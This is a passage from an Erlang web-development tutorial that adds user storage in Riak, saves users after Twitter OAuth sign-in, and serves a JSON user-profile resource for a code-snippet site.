</span><span class='line'><span class="nf">to_user</span><span class="p">(</span><span class="nv">Id</span><span class="p">,</span> <span class="nv">Name</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nl">#user</span><span class="p">{</span>
</span><span class='line'>    <span class="n">name</span> <span class="o">=</span> <span class="nv">Name</span><span class="p">,</span>
</span><span class='line'>    <span class="n">id</span> <span class="o">=</span> <span class="nv">Id</span><span class="p">,</span>
</span><span class='line'>    <span class="n">joined</span> <span class="o">=</span> <span class="nn">csd_date</span><span class="p">:</span><span class="n">utc_now</span><span class="p">()</span>
</span><span class='line'>  <span class="p">}.</span>
</span><span class='line'>
</span><span class='line'><span class="nf">get_id</span><span class="p">(</span><span class="nl">#user</span><span class="p">{</span><span class="n">id</span><span class="o">=</span><span class="nv">Id</span><span class="p">})</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nv">Id</span><span class="p">.</span>
</span><span class='line'>
</span><span class='line'><span class="nf">get_name</span><span class="p">(</span><span class="nl">#user</span><span class="p">{</span><span class="n">name</span><span class="o">=</span><span class="nv">Name</span><span class="p">})</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nv">Name</span><span class="p">.</span>
</span><span class='line'>
</span><span class='line'><span class="nf">fetch</span><span class="p">(</span><span class="nv">Id</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nn">csd_db</span><span class="p">:</span><span class="n">get_user</span><span class="p">(</span><span class="nv">Id</span><span class="p">).</span>
</span><span class='line'>
</span><span class='line'><span class="nf">save</span><span class="p">(</span><span class="nv">User</span><span class="o">=</span><span class="nl">#user</span><span class="p">{})</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nn">csd_db</span><span class="p">:</span><span class="n">save_user</span><span class="p">(</span><span class="nv">User</span><span class="p">).</span>
</span><span class='line'>
</span><span class='line'><span class="nf">to_json</span><span class="p">(</span><span class="nl">#user</span><span class="p">{</span><span class="n">name</span><span class="o">=</span><span class="nv">N</span><span class="p">,</span> <span class="n">id</span><span class="o">=</span><span class="nv">T</span><span class="p">,</span> <span class="n">joined</span><span class="o">=</span><span class="nv">J</span><span class="p">})</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nn">csd_json</span><span class="p">:</span><span class="n">to_json</span><span class="p">([{</span><span class="n">name</span><span class="p">,</span> <span class="nv">N</span><span class="p">},</span> <span class="p">{</span><span class="n">id</span><span class="p">,</span> <span class="nv">T</span><span class="p">},</span> <span class="p">{</span><span class="n">joined</span><span class="p">,</span> <span class="nv">J</span><span class="p">}],</span> <span class="k">fun</span> <span class="n">is_string</span><span class="o">/</span><span class="mi">1</span><span class="p">).</span>
</span><span class='line'>
</span><span class='line'><span class="nf">from_json</span><span class="p">(</span><span class="nv">UserJson</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nv">User</span> <span class="o">=</span> <span class="nn">csd_json</span><span class="p">:</span><span class="n">from_json</span><span class="p">(</span><span class="nv">UserJson</span><span class="p">,</span> <span class="k">fun</span> <span class="n">is_string</span><span class="o">/</span><span class="mi">1</span><span class="p">),</span>
</span><span class='line'>  <span class="nl">#user</span><span class="p">{</span>
</span><span class='line'>    <span class="n">id</span> <span class="o">=</span> <span class="nn">proplists</span><span class="p">:</span><span class="n">get_value</span><span class="p">(</span><span class="n">id</span><span class="p">,</span> <span class="nv">User</span><span class="p">),</span>
</span><span class='line'>    <span class="n">name</span> <span class="o">=</span> <span class="nn">proplists</span><span class="p">:</span><span class="n">get_value</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="nv">User</span><span class="p">),</span>
</span><span class='line'>    <span class="n">joined</span> <span class="o">=</span> <span class="nn">proplists</span><span class="p">:</span><span class="n">get_value</span><span class="p">(</span><span class="n">joined</span><span class="p">,</span> <span class="nv">User</span><span class="p">)</span>
</span><span class='line'>  <span class="p">}.</span>
</span><span class='line'>
</span><span class='line'><span class="c">%% --------------------------------------------------------------------------------------</span>
</span><span class='line'><span class="c">%% Internal Function Definitions</span>
</span><span class='line'><span class="c">%% --------------------------------------------------------------------------------------</span>
</span><span class='line'>
</span><span class='line'><span class="nf">is_string</span><span class="p">(</span><span class="n">name</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">true</span><span class="p">;</span>
</span><span class='line'><span class="nf">is_string</span><span class="p">(</span><span class="n">joined</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">true</span><span class="p">;</span>
</span><span class='line'><span class="nf">is_string</span><span class="p">(_)</span> <span class="o">-&gt;</span> <span class="n">false</span><span class="p">.</span>
</span></code></pre></td></tr></table></div></figure>


<p>This entire module fits the pattern that we have already applied to both the <code>snippet</code> and <code>vote</code> functionality. Rather than waste more characters in this post I&rsquo;m going to assume that you guys are able to digest this without any explanation. Ping me a comment below if you get stuck.</p>

<p>So what does the storage bit look like?</p>

<h3><a id="csd_user_store"></a><code>csd_user_store</code> module</h3>

<p>It looks like this!</p>

<figure class='code'><figcaption><span>apps/csd_core/src/csd_user_store.erl </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="p">-</span><span class="ni">module</span><span class="p">(</span><span class="n">csd_user_store</span><span class="p">).</span>
</span><span class='line'><span class="p">-</span><span class="ni">author</span><span class="p">(</span><span class="n">&#39;OJ Reeves &lt;oj@buffered.io&gt;&#39;</span><span class="p">).</span>
</span><span class='line'>
</span><span class='line'><span class="p">-</span><span class="ni">define</span><span class="p">(</span><span class="no">BUCKET</span><span class="p">,</span> <span class="o">&lt;&lt;</span><span class="s">&quot;user&quot;</span><span class="o">&gt;&gt;</span><span class="p">).</span>
</span><span class='line'>
</span><span class='line'><span class="c">%% --------------------------------------------------------------------------------------</span>
</span><span class='line'><span class="c">%% API Function Exports</span>
</span><span class='line'><span class="c">%% --------------------------------------------------------------------------------------</span>
</span><span class='line'>
</span><span class='line'><span class="p">-</span><span class="ni">export</span><span class="p">([</span><span class="n">fetch</span><span class="o">/</span><span class="mi">2</span><span class="p">,</span> <span class="n">save</span><span class="o">/</span><span class="mi">2</span><span class="p">]).</span>
</span><span class='line'>
</span><span class='line'><span class="c">%% --------------------------------------------------------------------------------------</span>
</span><span class='line'><span class="c">%% API Function Definitions</span>
</span><span class='line'><span class="c">%% --------------------------------------------------------------------------------------</span>
</span><span class='line'>
</span><span class='line'><span class="nf">fetch</span><span class="p">(</span><span class="nv">RiakPid</span><span class="p">,</span> <span class="nv">UserId</span><span class="p">)</span> <span class="k">when</span> <span class="nb">is_integer</span><span class="p">(</span><span class="nv">UserId</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="n">fetch</span><span class="p">(</span><span class="nv">RiakPid</span><span class="p">,</span> <span class="nb">integer_to_list</span><span class="p">(</span><span class="nv">UserId</span><span class="p">));</span>
</span><span class='line'><span class="nf">fetch</span><span class="p">(</span><span class="nv">RiakPid</span><span class="p">,</span> <span class="nv">UserId</span><span class="p">)</span> <span class="k">when</span> <span class="nb">is_list</span><span class="p">(</span><span class="nv">UserId</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="n">fetch</span><span class="p">(</span><span class="nv">RiakPid</span><span class="p">,</span> <span class="nb">list_to_binary</span><span class="p">(</span><span class="nv">UserId</span><span class="p">));</span>
</span><span class='line'><span class="nf">fetch</span><span class="p">(</span><span class="nv">RiakPid</span><span class="p">,</span> <span class="nv">UserId</span><span class="p">)</span> <span class="k">when</span> <span class="nb">is_binary</span><span class="p">(</span><span class="nv">UserId</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="k">case</span> <span class="nn">csd_riak</span><span class="p">:</span><span class="n">fetch</span><span class="p">(</span><span class="nv">RiakPid</span><span class="p">,</span> <span class="no">?BUCKET</span><span class="p">,</span> <span class="nv">UserId</span><span class="p">)</span> <span class="k">of</span>
</span><span class='line'>    <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="nv">RiakObj</span><span class="p">}</span> <span class="o">-&gt;</span>
</span><span class='line'>      <span class="nv">UserJson</span> <span class="o">=</span> <span class="nn">csd_riak</span><span class="p">:</span><span class="n">get_value</span><span class="p">(</span><span class="nv">RiakObj</span><span class="p">),</span>
</span><span class='line'>      <span class="nv">User</span> <span class="o">=</span> <span class="nn">csd_user</span><span class="p">:</span><span class="n">from_json</span><span class="p">(</span><span class="nv">UserJson</span><span class="p">),</span>
</span><span class='line'>      <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="nv">User</span><span class="p">};</span>
</span><span class='line'>    <span class="p">{</span><span class="n">error</span><span class="p">,</span> <span class="nv">Reason</span><span class="p">}</span> <span class="o">-&gt;</span>
</span><span class='line'>      <span class="p">{</span><span class="n">error</span><span class="p">,</span> <span class="nv">Reason</span><span class="p">}</span>
</span><span class='line'>  <span class="k">end</span><span class="p">.</span>
</span><span class='line'>
</span><span class='line'><span class="nf">save</span><span class="p">(</span><span class="nv">RiakPid</span><span class="p">,</span> <span class="nv">User</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nv">IntId</span> <span class="o">=</span> <span class="nn">csd_user</span><span class="p">:</span><span class="n">get_id</span><span class="p">(</span><span class="nv">User</span><span class="p">),</span>
</span><span class='line'>
</span><span class='line'>  <span class="c">% Id is int, so we need to conver to a binary</span>
</span><span class='line'>  <span class="nv">UserId</span> <span class="o">=</span> <span class="nb">list_to_binary</span><span class="p">(</span><span class="nb">integer_to_list</span><span class="p">(</span><span class="nv">IntId</span><span class="p">)),</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">case</span> <span class="nn">csd_riak</span><span class="p">:</span><span class="n">fetch</span><span class="p">(</span><span class="nv">RiakPid</span><span class="p">,</span> <span class="no">?BUCKET</span><span class="p">,</span> <span class="nv">UserId</span><span class="p">)</span> <span class="k">of</span>
</span><span class='line'>    <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="p">_</span><span class="nv">RiakObj</span><span class="p">}</span> <span class="o">-&gt;</span>
</span><span class='line'>      <span class="c">% user already exists, we don&#39;t need to save anything.</span>
</span><span class='line'>      <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="nv">User</span><span class="p">};</span>
</span><span class='line'>    <span class="p">{</span><span class="n">error</span><span class="p">,</span> <span class="n">notfound</span><span class="p">}</span> <span class="o">-&gt;</span>
</span><span class='line'>      <span class="nv">NewRiakObj</span> <span class="o">=</span> <span class="nn">csd_riak</span><span class="p">:</span><span class="n">create</span><span class="p">(</span><span class="no">?BUCKET</span><span class="p">,</span> <span class="nv">UserId</span><span class="p">,</span> <span class="nn">csd_user</span><span class="p">:</span><span class="n">to_json</span><span class="p">(</span><span class="nv">User</span><span class="p">)),</span>
</span><span class='line'>      <span class="n">ok</span> <span class="o">=</span> <span class="nn">csd_riak</span><span class="p">:</span><span class="n">save</span><span class="p">(</span><span class="nv">RiakPid</span><span class="p">,</span> <span class="nv">NewRiakObj</span><span class="p">),</span>
</span><span class='line'>      <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="nv">User</span><span class="p">}</span>
</span><span class='line'>  <span class="k">end</span><span class="p">.</span>
</span></code></pre></td></tr></table></div></figure>


<p>User management is really easy at this stage. We&rsquo;re doing basic store and retrieve operations without any real complexity. After seeing the <code>vote</code> and <code>snippet</code> functionality I&rsquo;m fairly certain that you&rsquo;ll be more than comfortable with this code.</p>

<p>For brevity I&rsquo;m going to skip going through a sample of storing/retrieving users via the Erlang shell and move on to something completely new. But first&hellip;</p>

<h2><a id="take-a-breath"></a>Take a Breath</h2>

<p>Phew! That was quite a bit to take in. Thanks for reading this far. Posts this long do take a bit of effort to get through. If you&rsquo;re not scared yet you should be as we&rsquo;ve now only covered the back-end stuff. We&rsquo;ve still got the Webmachine end to deal with. There&rsquo;s a bit to cover here as too, so fill that glass back up, do some Pilates and when you&rsquo;re refreshed come back and dive into the next section.</p>

<p>Ready? Good. Here we go.</p>

<h2><a id="save-user-on-login"></a>Saving User on Login</h2>

<p>Now that we have the ability to store the details of a user the first thing we&rsquo;re going to do is make a call to this new functionality when a user signs in successfully. For that we need to edit the <code>csd_web_callback_resource</code> module in the <code>csd_web</code> application. This is the module that is invoked when Twitter responds via OAuth. For the most part the module is the same, except for one function which looks like this:</p>

<figure class='code'><figcaption><span>apps/csd_web/src/csd_web_callback_resource.erl (partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="c">% ... snip ...</span>
</span><span class='line'>
</span><span class='line'><span class="nf">moved_temporarily</span><span class="p">(</span><span class="nv">ReqData</span><span class="p">,</span> <span class="nv">State</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nv">ReqToken</span> <span class="o">=</span> <span class="nn">wrq</span><span class="p">:</span><span class="n">get_qs_value</span><span class="p">(</span><span class="s">&quot;oauth_token&quot;</span><span class="p">,</span> <span class="nv">ReqData</span><span class="p">),</span>
</span><span class='line'>  <span class="nv">ReqTokenSecret</span> <span class="o">=</span> <span class="nn">wrq</span><span class="p">:</span><span class="n">get_qs_value</span><span class="p">(</span><span class="s">&quot;oauth_token_secret&quot;</span><span class="p">,</span> <span class="nv">ReqData</span><span class="p">),</span>
</span><span class='line'>  <span class="nv">Verifier</span> <span class="o">=</span> <span class="nn">wrq</span><span class="p">:</span><span class="n">get_qs_value</span><span class="p">(</span><span class="s">&quot;oauth_verifier&quot;</span><span class="p">,</span> <span class="nv">ReqData</span><span class="p">),</span>
</span><span class='line'>
</span><span class='line'>  <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="nv">AccessToken</span><span class="p">,</span> <span class="nv">AccessTokenSecret</span><span class="p">}</span> <span class="o">=</span> <span class="nn">twitter</span><span class="p">:</span><span class="n">verify_access</span><span class="p">(</span><span class="nv">ReqToken</span><span class="p">,</span> <span class="nv">ReqTokenSecret</span><span class="p">,</span> <span class="nv">Verifier</span><span class="p">),</span>
</span><span class='line'>  <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="nv">UserInfoJson</span><span class="p">}</span> <span class="o">=</span> <span class="nn">twitter</span><span class="p">:</span><span class="n">get_current_user_info</span><span class="p">(</span><span class="nv">AccessToken</span><span class="p">,</span> <span class="nv">AccessTokenSecret</span><span class="p">),</span>
</span><span class='line'>  <span class="p">{</span><span class="n">struct</span><span class="p">,</span> <span class="nv">Json</span><span class="p">}</span> <span class="o">=</span> <span class="nn">mochijson2</span><span class="p">:</span><span class="n">decode</span><span class="p">(</span><span class="nv">UserInfoJson</span><span class="p">),</span>
</span><span class='line'>  <span class="nv">UserId</span> <span class="o">=</span> <span class="nn">proplists</span><span class="p">:</span><span class="n">get_value</span><span class="p">(</span><span class="o">&lt;&lt;</span><span class="s">&quot;id&quot;</span><span class="o">&gt;&gt;</span><span class="p">,</span> <span class="nv">Json</span><span class="p">),</span>
</span><span class='line'>  <span class="nv">UserName</span> <span class="o">=</span> <span class="nn">proplists</span><span class="p">:</span><span class="n">get_value</span><span class="p">(</span><span class="o">&lt;&lt;</span><span class="s">&quot;screen_name&quot;</span><span class="o">&gt;&gt;</span><span class="p">,</span> <span class="nv">Json</span><span class="p">),</span>
</span><span class='line'>  <span class="nv">NewReqData</span> <span class="o">=</span> <span class="nn">cookie</span><span class="p">:</span><span class="n">store_auth</span><span class="p">(</span><span class="nv">ReqData</span><span class="p">,</span> <span class="nv">UserId</span><span class="p">,</span> <span class="nv">UserName</span><span class="p">,</span> <span class="nv">AccessToken</span><span class="p">,</span> <span class="nv">AccessTokenSecret</span><span class="p">),</span>
</span><span class='line'>
</span><span class='line'>  <span class="nv">User</span> <span class="o">=</span> <span class="nn">csd_user</span><span class="p">:</span><span class="n">to_user</span><span class="p">(</span><span class="nv">UserId</span><span class="p">,</span> <span class="nv">UserName</span><span class="p">),</span>   <span class="c">%% -- new functionality</span>
</span><span class='line'>  <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="p">_}</span> <span class="o">=</span> <span class="nn">csd_user</span><span class="p">:</span><span class="n">save</span><span class="p">(</span><span class="nv">User</span><span class="p">),</span>               <span class="c">%% -- new functionality</span>
</span><span class='line'>
</span><span class='line'>  <span class="c">% TODO: error handlng for when things don&#39;t go to plan</span>
</span><span class='line'>  <span class="p">{{</span><span class="n">true</span><span class="p">,</span> <span class="nn">conf</span><span class="p">:</span><span class="n">get_val</span><span class="p">(</span><span class="n">urimap</span><span class="p">,</span> <span class="n">home</span><span class="p">)},</span> <span class="nv">NewReqData</span><span class="p">,</span> <span class="nv">State</span><span class="p">}.</span>
</span></code></pre></td></tr></table></div></figure>


<p>The two new lines are highlighted with comments. You can see we&rsquo;re just creating a new user record by specifying the id and password, and then persisting this to Riak through the <code>csd_user</code> module. Simple stuff! User details will now be persisted when the user successfully signs in. We&rsquo;re not yet handling the case where the user decides not to sign in, or if the process fails, but we&rsquo;ll get to that in a future post.</p>

<h2><a id="post-sign-in"></a>Post Sign-In</h2>

<p>To briefly recap, when a user hits our site for the first time want to ask them to sign in. Once they have done so, we know who they are and we want to show a different view. the <code>moved_temporarily</code> function above redirects them back to this page after a successful sign in. Given that we have the ability to find out who they are, we need to respond differently on the home page view. When a recognised user signs in we&rsquo;re going to show them a landing page with a list of the snippets that they have submitted. To do this, we&rsquo;re going to need to know their Twitter Id, as that&rsquo;s what we&rsquo;re using to identify the owner of a snippet.</p>

<p>We need to make a very slight adjustment to our main <code>csd_web_resource</code> module so that we extract the user&rsquo;s Id at the same time as their name.</p>

<figure class='code'><figcaption><span>apps/csd_web/src/csd_web_resource.erl (partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="c">% ... snip ...</span>
</span><span class='line'>
</span><span class='line'><span class="nf">to_html</span><span class="p">(</span><span class="nv">ReqData</span><span class="p">,</span> <span class="nv">State</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nv">Content</span> <span class="o">=</span> <span class="k">case</span> <span class="nn">cookie</span><span class="p">:</span><span class="n">load_auth</span><span class="p">(</span><span class="nv">ReqData</span><span class="p">)</span> <span class="k">of</span>
</span><span class='line'>    <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="p">{</span><span class="nv">UserId</span><span class="p">,</span> <span class="nv">Name</span><span class="p">,</span> <span class="p">_,</span> <span class="p">_}}</span> <span class="o">-&gt;</span>       <span class="c">%% -- this is what we changed</span>
</span><span class='line'>      <span class="nn">csd_view</span><span class="p">:</span><span class="n">home</span><span class="p">(</span><span class="nv">UserId</span><span class="p">,</span> <span class="nv">Name</span><span class="p">);</span>
</span><span class='line'>    <span class="p">_</span> <span class="o">-&gt;</span>
</span><span class='line'>      <span class="nn">csd_view</span><span class="p">:</span><span class="n">home</span><span class="p">()</span>
</span><span class='line'>  <span class="k">end</span><span class="p">,</span>
</span><span class='line'>  <span class="p">{</span><span class="nv">Content</span><span class="p">,</span> <span class="nv">ReqData</span><span class="p">,</span> <span class="nv">State</span><span class="p">}.</span>
</span><span class='line'>
</span><span class='line'><span class="c">% ... snip ...</span>
</span></code></pre></td></tr></table></div></figure>


<p>In the [last post][Part4] we had already stored a few details about the user in their auth cookie, but we were only extracting their name. To get their Id as well we just needed to change our pattern match from <code>{_, Name, _, _}</code> to <code>{UserId, Name, _, _}</code>. We then pass this extra detail into the call to <code>csd_view:home</code> so that we can utilise that down the track. This new parameter needs to be handled by <code>csd_view</code> so let&rsquo;s take a look at the changes there.</p>

<figure class='code'><figcaption><span>apps/csd_web/src/csd_view.erl (partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="c">% ... snip ...</span>
</span><span class='line'>
</span><span class='line'><span class="nf">home</span><span class="p">(</span><span class="nv">UserId</span><span class="p">,</span> <span class="nv">Name</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nv">Params</span> <span class="o">=</span> <span class="p">[{</span><span class="n">logged_in</span><span class="p">,</span> <span class="n">true</span><span class="p">},</span> <span class="p">{</span><span class="n">user_id</span><span class="p">,</span> <span class="nv">UserId</span><span class="p">},</span> <span class="p">{</span><span class="n">user_name</span><span class="p">,</span> <span class="nv">Name</span><span class="p">}],</span>
</span><span class='line'>  <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="nv">Content</span><span class="p">}</span> <span class="o">=</span> <span class="nn">home_dtl</span><span class="p">:</span><span class="n">render</span><span class="p">(</span><span class="nv">Params</span><span class="p">),</span>
</span><span class='line'>  <span class="nv">Content</span><span class="p">.</span>
</span><span class='line'>
</span><span class='line'><span class="c">% ... snip ...</span>
</span></code></pre></td></tr></table></div></figure>


<p>The only difference here is that we&rsquo;re now passing <code>{user_id, UserId}</code> down to the template renderer as well as other detail. This means the view can do something useful with it. We&rsquo;ll go over that a bit later when we cover off the UI, but for now let&rsquo;s take a look at what happens when the user&rsquo;s &ldquo;profile&rdquo; page is rendered.</p>

<h2><a id="user-profile"></a>User Profile</h2>

<p>The user profile page is what is displayed when the user signs in or comes back to the site while their cookie is still valid. This page contains a list of snippets that the user submitted listed in reverse chronological order. As a sneak preview, this is what we&rsquo;re striving for:</p>

<p><img src="http://buffered.io/uploads/2012/07/part5-user-profile.png" title="'User profile page'" ></p>

<p>Please excuse my obvious test data, but you should get the idea. Each snippet listed on the page is shown as a link which gives the user direct access to the page specific to that snippet. So let&rsquo;s take a look at the resource code which provides the data for this view. This is an entirely new module called <code>csd_web_user_detail_resource</code>.</p>

<p>I&rsquo;ve trimmed out some of the usual cruft for brevity and am showing just the interesting bits. The full source is available on Github and linked at the bottom of the post.</p>

<figure class='code'><figcaption><span>apps/csd_web/priv/app.config </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="c">% ... snip ...</span>
</span><span class='line'>
</span><span class='line'><span class="nf">content_types_provided</span><span class="p">(</span><span class="nv">ReqData</span><span class="p">,</span> <span class="nv">State</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nv">Types</span> <span class="o">=</span> <span class="p">[</span>
</span><span class='line'>    <span class="p">{</span><span class="s">&quot;application/json&quot;</span><span class="p">,</span> <span class="n">to_json</span><span class="p">}</span>
</span><span class='line'>  <span class="p">],</span>
</span><span class='line'>  <span class="p">{</span><span class="nv">Types</span><span class="p">,</span> <span class="nv">ReqData</span><span class="p">,</span> <span class="nv">State</span><span class="p">}.</span>
</span><span class='line'>
</span><span class='line'><span class="c">% ... snip ...</span>
</span></code></pre></td></tr></table></div></figure>


<p>Why is this interesting? Because the resource will only serve JSON. The JSON is accessed via Ajax in the view and rendered in a custom template in the browser. More on this detail a bit later.</p>

<figure class='code'><figcaption><span>apps/csd_web/priv/app.config </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="c">% ... snip ...</span>
</span><span class='line'>
</span><span class='line'><span class="nf">to_json</span><span class="p">(</span><span class="nv">ReqData</span><span class="p">,</span> <span class="nv">State</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nv">PathInfo</span> <span class="o">=</span> <span class="nn">wrq</span><span class="p">:</span><span class="n">path_info</span><span class="p">(</span><span class="nv">ReqData</span><span class="p">),</span>
</span><span class='line'>  <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="nv">UserId</span><span class="p">}</span> <span class="o">=</span> <span class="nn">dict</span><span class="p">:</span><span class="n">find</span><span class="p">(</span><span class="n">user_id</span><span class="p">,</span> <span class="nv">PathInfo</span><span class="p">),</span>
</span><span class='line'>
</span><span class='line'>  <span class="c">% We need to render a username, but don&#39;t hit the DB</span>
</span><span class='line'>  <span class="c">% if the user is the same as the one looking at the</span>
</span><span class='line'>  <span class="c">% page.</span>
</span><span class='line'>  <span class="nv">UserName</span> <span class="o">=</span> <span class="k">case</span> <span class="nn">cookie</span><span class="p">:</span><span class="n">load_auth</span><span class="p">(</span><span class="nv">ReqData</span><span class="p">)</span> <span class="k">of</span>
</span><span class='line'>    <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="p">{</span><span class="nv">UserId</span><span class="p">,</span> <span class="nv">Name</span><span class="p">,</span> <span class="p">_,</span> <span class="p">_}}</span> <span class="o">-&gt;</span>
</span><span class='line'>      <span class="nv">Name</span><span class="p">;</span>
</span><span class='line'>    <span class="p">_</span> <span class="o">-&gt;</span>
</span><span class='line'>      <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="nv">UserInfo</span><span class="p">}</span> <span class="o">=</span> <span class="nn">csd_user</span><span class="p">:</span><span class="n">fetch</span><span class="p">(</span><span class="nv">UserId</span><span class="p">),</span>
</span><span class='line'>      <span class="nb">list_to_binary</span><span class="p">(</span><span class="nn">csd_user</span><span class="p">:</span><span class="n">get_name</span><span class="p">(</span><span class="nv">UserInfo</span><span class="p">))</span>
</span><span class='line'>  <span class="k">end</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>  <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="nv">Snippets</span><span class="p">}</span> <span class="o">=</span> <span class="nn">csd_snippet</span><span class="p">:</span><span class="n">list_for_user</span><span class="p">(</span><span class="nv">UserId</span><span class="p">),</span>
</span><span class='line'>  <span class="nv">UserData</span> <span class="o">=</span> <span class="p">{</span><span class="n">struct</span><span class="p">,</span> <span class="p">[</span>
</span><span class='line'>      <span class="p">{</span><span class="n">user_name</span><span class="p">,</span> <span class="nv">UserName</span><span class="p">},</span>
</span><span class='line'>      <span class="p">{</span><span class="n">snippets</span><span class="p">,</span> <span class="nv">Snippets</span><span class="p">}</span>
</span><span class='line'>    <span class="p">]},</span>
</span><span class='line'>  <span class="nv">Json</span> <span class="o">=</span> <span class="nn">mochijson2</span><span class="p">:</span><span class="n">encode</span><span class="p">(</span><span class="nv">UserData</span><span class="p">),</span>
</span><span class='line'>  <span class="p">{</span><span class="nv">Json</span><span class="p">,</span> <span class="nv">ReqData</span><span class="p">,</span> <span class="nv">State</span><span class="p">}.</span>
</span></code></pre></td></tr></table></div></figure>


